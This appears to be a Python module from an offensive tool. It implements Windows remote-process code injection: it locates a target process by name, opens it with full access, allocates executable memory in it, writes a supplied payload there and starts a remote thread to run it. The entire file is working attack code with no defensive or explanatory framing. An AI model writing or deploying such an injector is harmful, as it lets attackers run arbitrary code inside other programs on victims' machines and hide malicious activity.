import ctypes
from constants.variable import *
import os
import wmi
from window_api.api import winapi_kernel32

class Injector:
    def __init__(self, process_name, source):
        self.process_name = process_name
        self.source = source
        self.handle = ctypes.wintypes.HANDLE()
        self.memory = ctypes.wintypes.LPVOID()

    def get_process_id(self):
        processes = wmi.WMI().Win32_Process(name=self.process_name)
        if len(processes) == 0: 
            raise IndexError(f"Program {self.process_name} does not run")

        pid = processes[0].ProcessId
        print(f"[*] {self.process_name} have process id: {pid}")

        return int(pid)

    def open_process(self):
        self.handle = winapi_kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, self.get_process_id())
        print("[*] Opened a Handle to the process")

    def virtual_alloc_ex(self):
        self.memory = winapi_kernel32.VirtualAllocEx(\
            self.handle, None, len(self.source), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        print('[*] Allocated Memory in the process')

    def  write_process_memory(self):
        writing = ctypes.wintypes.BOOL()
        c_null = ctypes.c_int(0)
        writing = winapi_kernel32.WriteProcessMemory(\
            self.handle, self.memory, self.source, len(self.source), ctypes.byref(c_null))

        if writing:
            print('[*] Wrote The source to memory')

    def execute(self):
        try:
            print("Injecting...")
            self.open_process()
            self.virtual_alloc_ex()
            self.write_process_memory()
            injection = winapi_kernel32.CreateRemoteThread(self.handle, None, 0, self.memory, None, EXECUTE_IMMEDIATELY, None)

            if injection:
                print('[*] Injected the source into the process')
                winapi_kernel32.CloseHandle(self.handle)
        except Exception as error:
            print(f"[*] Error: {error}")
